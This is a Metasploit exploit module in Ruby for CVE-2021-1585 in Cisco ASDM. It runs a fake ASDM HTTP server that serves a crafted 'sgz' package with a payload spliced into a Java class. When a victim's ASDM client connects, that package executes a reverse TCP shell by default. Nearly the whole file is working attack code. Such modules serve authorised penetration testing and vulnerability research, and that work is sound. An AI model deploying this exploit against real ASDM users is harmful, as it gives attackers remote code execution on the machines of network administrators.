##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'lzma'

class MetasploitModule < Msf::Exploit::Remote

  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco ASDM Evil Endpoint Code Execution',
        'Description' => %q{
          This module exploits Cisco Adaptive Security Device Manager (ASDM) before 7.18.1. ASDM will load and
          execute specially crafted Java provided by an evil endpoint (CVE-2021-1585). To exploit this issue,
          the ASDM user must connect the ASDM client to the modules HTTP server.
          
          Exploitation results in in-memory execution as the ASDM user. However, this module quickly spawns a
          new process via cmd.exe because the user terminating the ASDM client would also terminate the shell.

          Note that ASDM 7.18.1+ are also vulnerable to this issue, but exploitation requires the HTTP server
          also serve the Cisco signed jploader.jar (which obviously we cannot distribute).
        },
        'Author' => [
          'Malcolm Lashley', # Discovery and PoC
          'jbaines-r7' # PoC and module
        ],
        'References' => [
          ['CVE', '2021-1585'],
          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asdm-rce-gqjShXW'],
          ['URL', 'https://gist.github.com/mlashley/7d2c16e91fe37c9ab3b2352615540025'],
          ['URL', 'https://attackerkb.com/topics/0vIso8fLhQ/cve-2021-1585/rapid7-analysis'],
          ['URL', 'https://github.com/jbaines-r7/staystaystay']
        ],
        'DisclosureDate' => '2021-07-07',
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_CMD,
        'Privileged' => false,
        'Targets' => [ [ 'Automatic', {} ] ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'SRVPORT' => 8443,
          'SSL' => true,
          'URIPATH' => '/',
          'PAYLOAD' => 'cmd/windows/jjs_reverse_tcp'
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
  end

  def int_to_bin(int, size)
    hex = int.to_s(16)
    size *= 2
    hex = '0' + hex while (hex.length < size)
    hex.scan(/../).map { |x| x.hex.chr }.join
  end

  # Wrap the payload in "sgz" format. SGZ appears to be an undocumented Cisco thing.
  # 
  def generate_sgz(cli)
    # sneak the payload into the pre-compiled java class
    payload = regenerate_payload(cli)
    pdm_path = File.join(Msf::Config.data_directory, 'exploits', 'cve-2021-1585', 'PDMApplet.class')
    pdm_template = File.open(pdm_path, 'rb') { |fd| fd.read(fd.stat.size) }
    pdm_class = pdm_template[0..406]
    pdm_class += int_to_bin(payload.raw.to_s.length, 2)
    pdm_class += payload.raw.to_s
    pdm_class += pdm_template[422..]

    # wrap the class in a "jar entry"
    class_name = 'com/cisco/pdm/PDMApplet.class'
    jar_entry = int_to_bin(class_name.length, 2).reverse
    jar_entry += class_name
    jar_entry += int_to_bin(pdm_class.length, 4).reverse
    jar_entry += pdm_class

    # compress the entry
    compressed = LZMA.compress(jar_entry)

    # generate the "fingerprint" for the sgz file. Random is fine.
    fingerprint = ''
    16.times do
      fingerprint += Rex::Text.rand_char('')
    end
    fingerprint += "\x67"

    # generate a header for the compressed jar entry
    jar_header = int_to_bin(compressed.length, 4).reverse
    jar_header += "\x03"

    # form the sgz file
    fingerprint + jar_header + compressed + "\xff\xff\xff\xff\x00"
  end

  # This exploit cares about three requests:
  # 1. /admin/login_banner - which can just be empty. It has to exist is all.
  # 2. /admin/version.prop - this will tell the launcher how to. launcher.version is set
  #    artificially low so that we don't prompt "update" logic. asdm.version should be set to
  #    7.18+ in order to exploit the unsupported version of this exploit.
  # 3. /admin/pdm.sgz - this is where we'll embed the exploit
  def process_get(cli, request)
    print_status("[+] Handling #{request.uri}")
    case request.uri
    when '/admin/login_banner'
      resp = create_response(200, 'OK')
      resp.body = "\n"
      resp['Content-Type'] = 'text/html'
    when '/admin/version.prop'
      resp = create_response(200, 'OK')
      resp.body = "#version file\n" \
        "#Thu March 19 06:33:41 PDT 2020\n" \
        "asdm.version=7.14(1)\n" \
        "launcher.size=880128\n" \
        "launcher.version=1.0.0\n"
      resp['Content-Type'] = 'text/html'
    when '/admin/pdm.sgz'
      # yeet malicious sgz at victim
      sgz = generate_sgz(cli)
      resp = create_response(200, 'OK')
      resp.body = sgz
      resp['Content-Type'] = 'application/octet-stream'
    else
      resp = create_response(404, 'Not Found')
      resp.body = ''
      resp['Content-Type'] = 'text/html'
    end
    cli.send_response(resp)
  end

  def on_request_uri(cli, request)
    case request.method
    when 'GET'
      process_get(cli, request)
    else
      print_error("Unexpected request method encountered: #{request.method}")
      resp = create_response(404, 'Not Found')
      resp.body = ''
      resp['Content-Type'] = 'text/html'
      cli.send_response(resp)
    end
  end
end
